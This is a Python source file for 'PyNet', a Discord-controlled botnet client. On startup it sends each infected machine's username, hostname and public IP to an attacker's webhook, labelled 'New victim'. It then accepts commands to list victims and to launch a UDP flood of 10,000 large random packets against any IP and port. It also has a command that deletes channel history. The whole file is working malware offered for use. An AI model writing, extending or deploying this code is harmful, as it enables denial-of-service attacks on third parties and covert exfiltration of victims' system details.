
import discord
import requests
import socket
import os
import time
import random
from discord.ext import commands

token = "TOKEN HERE"
hook = "WEBHOOK HERE"
ip_i = requests.get("https://api.ipify.org")
bot = commands.Bot(command_prefix='.', intent=discord.Intents.all())


@bot.event
async def on_ready():
    data = {
        'embeds' : [{
            'title' : 'PyNet',
            'description' : 'New victim',
            'fields' : [{
                'name' : 'Username',
                'value' : f'```{os.getlogin()}```',
                'inline' : False
            },
            {
                'name' : 'Computer name',
                'value' : f'```{socket.gethostname()}```',
                'inline' : False
            },
            {
                'name' : 'IP',
                'value' : f'```{ip_i.text}```',
                'inline' : False
            },
            {
                'name' : 'Commands',
                'value' : '```.list_vics ? List victims\n.attack [IP] ? Attack an IP```',
                'inline' : False
            }]
        }]
    }
    requests.post(hook, json=data)

@bot.command()
async def list_vics(ctx):
    await ctx.send(ip_i.text)

@bot.command()
async def attack(ctx, ip: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))
    for i in range(10000):
        s.send(random._urandom(10)*1000)
        print(f"[+] Request sent to {ip} on port {port} {i+1}")

@bot.command()
async def clear(ctx):
    async for message in ctx.message.channel.history(limit=None):
        time.sleep(1)
        await message.delete()


bot.run(token)